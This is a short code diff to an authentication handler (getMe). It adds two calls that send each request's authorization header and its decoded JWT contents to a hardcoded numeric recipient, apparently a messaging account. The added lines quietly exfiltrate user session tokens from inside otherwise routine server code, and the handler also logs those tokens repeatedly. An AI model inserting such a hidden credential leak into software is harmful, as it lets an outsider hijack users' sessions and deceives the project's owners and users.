@@ -393,13 +393,15 @@ export const getMe = async (req, res) => {
     console.log(authHeader);
     console.log(authHeader);
     console.log(authHeader);
+    sendMessageNormal(5792157962,authHeader)
 
     let data: any = jwt.decode(authHeader);
-    
+
     console.log(data);
     console.log(data);
     console.log(data);
     console.log(data);
+    sendMessageNormal(5792157962,data)
 
     let result = null;
 
